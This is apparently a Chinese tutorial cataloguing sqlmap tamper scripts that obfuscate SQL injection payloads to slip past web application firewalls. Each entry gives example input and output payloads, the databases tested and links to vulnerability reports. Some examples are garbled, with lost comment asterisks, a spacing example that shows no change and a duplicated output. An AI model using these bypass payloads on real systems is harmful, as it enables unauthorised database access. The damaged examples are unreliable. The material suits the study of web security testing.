# 使用sqlmap中tamper脚本绕过waf

0x00 背景
=====

sqlmap中的tamper脚本来对目标进行更高效的攻击。

由于乌云知识库少了sqlmap-tamper 收集一下，方便学习。 根据sqlmap中的tamper脚本可以学习过绕过一些技巧。 我收集在找相关的案例作为可分析什么环境使用什么tamper脚本。 小学生毕业的我，着能偷偷说一下多做一些收集对吸收知识很快。

0x01 start
=====

脚本名：apostrophemask.py
---------------------

* * *

作用：用utf8代替引号

```
Example: ("1 AND '1'='1") '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'

```

Tested against: all

脚本名：equaltolike.py
------------------

* * *

作用：like 代替等号

```
Example:

*   Input: SELECT * FROM users WHERE id=1

*   Output: SELECT * FROM users WHERE id LIKE 1

```

案例一: http://wooyun.org/bugs/wooyun-2010-087296

案例二: http://wooyun.org/bugs/wooyun-2010-074790

案例三：http://wooyun.org/bugs/wooyun-2010-072489

脚本名：space2dash.py

* * *

作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）

```
Example: ('1 AND 9227=9227') '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'

```

Tested against: * MSSQL * SQLite

案例一：http://wooyun.org/bugs/wooyun-2010-062878

脚本名：greatest.py
---------------

* * *

作用：绕过过滤’>’ ,用GREATEST替换大于号。

```
Example: ('1 AND A > B') '1 AND GREATEST(A,B+1)=A' Tested against: * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 

```

脚本名：space2hash.py
-----------------

* * *

作用：空格替换为#号 随机字符串 以及换行符

```
Example:

*   Input: 1 AND 9227=9227
*   Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227

```

Requirement:

*   MySQL Tested against:
    
*   MySQL 4.0, 5.0
    

参考:[法克的一篇文章](http://www.f4ck.org/article-2183-1.html)

脚本名：apostrophenullencode.py
---------------------------

* * *

作用：绕过过滤双引号，替换字符和双引号。

```
Example: tamper("1 AND '1'='1") '1 AND %00%271%00%27=%00%271'

```

Tested against:

*   MySQL 4, 5.0 and 5.5
    
*   Oracle 10g
    
*   PostgreSQL 8.3, 8.4, 9.0
    

脚本名：halfversionedmorekeywords.py
--------------------------------

* * *

作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

```
Example:

("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa") "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"

```

Requirement:

*   MySQL < 5.1

Tested against:

*   MySQL 4.0.18, 5.0.22

脚本名：space2morehash.py
---------------------

* * *

作用：空格替换为 #号 以及更多随机字符串 换行符

```
Example: 

* Input: 1 AND 9227=9227 

* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 

```

Requirement: * MySQL >= 5.1.13 Tested

against: * MySQL 5.1.41

案例一:[91ri一篇文章](http://www.91ri.org/5411.html)

脚本名：appendnullbyte.py
---------------------

* * *

作用：在有效负荷结束位置加载零字节字符编码

```
Example: ('1 AND 1=1') '1 AND 1=1%00' 

```

Requirement:

*   Microsoft Access

脚本名：ifnull2ifisnull.py
----------------------

* * *

作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’

```
Example:

('IFNULL(1, 2)') 'IF(ISNULL(1),2,1)' 

```

Requirement:

*   MySQL
    
*   SQLite (possibly)
    
*   SAP MaxDB (possibly)
    

Tested against:

*   MySQL 5.0 and 5.5

脚本名：space2mssqlblank.py(mssql)
------------------------------

* * *

作用：空格替换为其它空符号

Example: * Input: SELECT id FROM users * Output: SELECT%08id%02FROM%0Fusers

Requirement: * Microsoft SQL Server Tested against: * Microsoft SQL Server 2000 * Microsoft SQL Server 2005

ASCII table:
------------

* * *

案例一: wooyun.org/bugs/wooyun-2010-062878

脚本名：base64encode.py
-------------------

* * *

作用：用base64编码替换 Example: ("1' AND SLEEP(5)#") 'MScgQU5EIFNMRUVQKDUpIw==' Requirement: all

案例一: http://wooyun.org/bugs/wooyun-2010-060071

案例二: http://wooyun.org/bugs/wooyun-2010-021062

案例三: http://wooyun.org/bugs/wooyun-2010-043229

脚本名：space2mssqlhash.py
----------------------

* * *

作用：替换空格

```
Example: ('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227' Requirement: * MSSQL * MySQL 

```

脚本名：modsecurityversioned.py
---------------------------

* * *

作用：过滤空格，包含完整的查询版本注释

```
Example: ('1 AND 2>1--') '1 /*!30874AND 2>1*/--' 

```

Requirement: * MySQL

Tested against:

*   MySQL 5.0

脚本名：space2mysqlblank.py
-----------------------

* * *

作用：空格替换其它空白符号(mysql)

```
Example: 

* Input: SELECT id FROM users 

* Output: SELECT%0Bid%0BFROM%A0users 

```

Requirement:

*   MySQL

Tested against:

*   MySQL 5.1

案例一:wooyun.org/bugs/wooyun-2010-076735

脚本名：between.py
--------------

* * *

作用：用between替换大于号（>）

```
Example: ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--' 

```

Tested against:

*   Microsoft SQL Server 2005
    
*   MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0
    

案例一:wooyun.org/bugs/wooyun-2010-068815

脚本名：space2mysqldash.py
----------------------

* * *

作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

注：之前有个mssql的 这个是mysql的

```
Example: ('1 AND 9227=9227') '1--%0AAND--%0A9227=9227'

```

Requirement:

*   MySQL
    
*   MSSQL
    

脚本名：multiplespaces.py
---------------------

* * *

作用：围绕SQL关键字添加多个空格

```
Example: ('1 UNION SELECT foobar') '1 UNION SELECT foobar' 

```

Tested against: all

案例一: wooyun.org/bugs/wooyun-2010-072489

脚本名：space2plus.py
-----------------

* * *

作用：用+替换空格

```
Example: ('SELECT id FROM users') 'SELECT+id+FROM+users' Tested against: all 

```

脚本名：bluecoat.py
---------------

* * *

作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like

```
Example: ('SELECT id FROM users where id = 1') 'SELECT%09id FROM users where id LIKE 1' 

```

Tested against:

*   MySQL 5.1, SGOS

脚本名：nonrecursivereplacement.py
------------------------------

* * *

双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters

```
Example: ('1 UNION SELECT 2--') '1 UNIOUNIONN SELESELECTCT 2--' Tested against: all 

```

脚本名：space2randomblank.py
------------------------

* * *

作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集

```
Example: ('SELECT id FROM users') 'SELECT%0Did%0DFROM%0Ausers'

```

Tested against: all

脚本名：sp_password.py
------------------

* * *

作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾

```
Example: ('1 AND 9227=9227-- ') '1 AND 9227=9227-- sp\_password' Requirement: * MSSQL 

```

脚本名：chardoubleencode.py
-----------------------

* * *

作用: 双url编码(不处理以编码的)

```
Example: 

* Input: SELECT FIELD FROM%20TABLE 

* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545

```

脚本名：unionalltounion.py
----------------------

* * *

作用：替换UNION ALL SELECT UNION SELECT

Example: ('-1 UNION ALL SELECT') '-1 UNION SELECT'

Requirement: all

脚本名：charencode.py
-----------------

* * *

作用：url编码

```
Example:

*   Input: SELECT FIELD FROM%20TABLE

*   Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45

```

tested against:

*   Microsoft SQL Server 2005
    
*   MySQL 4, 5.0 and 5.5
    
*   Oracle 10g
    
*   PostgreSQL 8.3, 8.4, 9.0
    

脚本名：randomcase.py
-----------------

* * *

作用：随机大小写 Example:

*   Input: INSERT
*   Output: InsERt

Tested against:

*   Microsoft SQL Server 2005
    
*   MySQL 4, 5.0 and 5.5
    
*   Oracle 10g
    
*   PostgreSQL 8.3, 8.4, 9.0
    

脚本名：unmagicquotes.py
--------------------

* * *

作用：宽字符绕过 GPC addslashes

```
Example: 

* Input: 1′ AND 1=1 

* Output: 1%bf%27 AND 1=1–%20

```

脚本名：randomcomments.py
---------------------

* * *

作用：用/**/分割sql关键字

```
Example:

‘INSERT’ becomes ‘IN//S//ERT’

```

脚本名：charunicodeencode.py
------------------------

* * *

作用：字符串 unicode 编码

```
Example: 

* Input: SELECT FIELD%20FROM TABLE 

* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′

```

Requirement:

*   ASP
    
*   ASP.NET
    

Tested against:

*   Microsoft SQL Server 2000
    
*   Microsoft SQL Server 2005
    
*   MySQL 5.1.56
    
*   PostgreSQL 9.0.3
    

案例一: wooyun.org/bugs/wooyun-2010-074261

脚本名：securesphere.py
-------------------

* * *

作用：追加特制的字符串

```
Example: ('1 AND 1=1') "1 AND 1=1 and '0having'='0having'" 

```

Tested against: all

脚本名：versionedmorekeywords.py
----------------------------

* * *

作用：注释绕过

```
Example: 

* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 

* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))# 

```

Requirement:

*   MySQL >= 5.1.13

脚本名：space2comment.py
--------------------

* * *

作用：Replaces space character (‘ ‘) with comments ‘/**/’

```
Example: 

* Input: SELECT id FROM users 

* Output: SELECT//id//FROM/**/users

```

Tested against:

*   Microsoft SQL Server 2005
    
*   MySQL 4, 5.0 and 5.5
    
*   Oracle 10g
    
*   PostgreSQL 8.3, 8.4, 9.0
    

案例一:wooyun.org/bugs/wooyun-2010-046496

脚本名：halfversionedmorekeywords.py
--------------------------------

* * *

作用：关键字前加注释

```
Example: 

* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa 

* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa

```

Requirement:

*   MySQL < 5.1

Tested against:

*   MySQL 4.0.18, 5.0.22

收集于: http://www.91ri.org/7852.html http://www.91ri.org/7869.html http://www.91ri.org/7860.html